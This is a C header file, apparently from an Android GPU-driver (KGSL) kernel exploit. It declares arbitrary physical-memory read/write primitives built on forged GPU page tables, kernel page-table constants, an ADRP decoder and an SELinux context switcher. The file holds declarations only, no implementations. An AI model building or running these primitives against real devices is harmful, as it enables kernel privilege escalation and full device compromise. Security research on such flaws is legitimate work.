static uint64_t g_level1_dcache_size;
struct cheese_gpu_rw {
    int fd;
    uint32_t ctx_id;

    uint32_t* payload_buf;
    uint64_t payload_gpuaddr;
    uint32_t* output_buf;
    uint64_t output_gpuaddr;

    void* target_physical_page;

    uint64_t phyaddr;

    void* garbage;
};

extern const uint64_t kFakeGpuAddr;
extern const uint64_t kGarbageSize;
extern const uint64_t kKernelPageTableEntry;

int kgsl_ctx_create0(int fd, uint32_t *ctx_id);
int kgsl_ctx_destroy(int fd, uint32_t ctx_id);
int kgsl_map(int fd, unsigned long addr, size_t len, uint64_t *gpuaddr);
int kgsl_gpu_command_payload(int fd, uint32_t ctx_id, uint64_t gpuaddr, uint32_t cmdsize, uint32_t n, uint32_t target_idx, uint64_t target_cmd, uint32_t target_size);
int setup_pagetables(uint8_t *tt0, uint32_t pages, uint32_t tt0phys, uint64_t fake_gpuaddr, uint64_t target_pa);
uint32_t tu_get_l1_dcache_size();

static void sync_cache_to_gpu(void* start, void* end);
static void sync_cache_from_gpu(void* start, void* end);

#ifdef DUMP_PAGEMAP
uint64_t GetPhys(int pagemap_fd, uint64_t virt);
#endif
uint64_t cheese_decode_adrp(uint32_t instr, uint64_t pc);
static int DoWrite(int fd, int ctx_id, uint32_t* payload_buf, uint64_t payload_gpuaddr, uint64_t phyaddr, uint64_t completion_marker_write_addr, bool write, uint64_t write_addr, uint32_t count, uint32_t* values);
int cheese_gpu_rw_setup(struct cheese_gpu_rw* cheese);
int cheese_shutdown(struct cheese_gpu_rw* cheese);
void stupid_memcpy(void* dst, const void* src, size_t count);
void stupid_setexeccon(const char* con);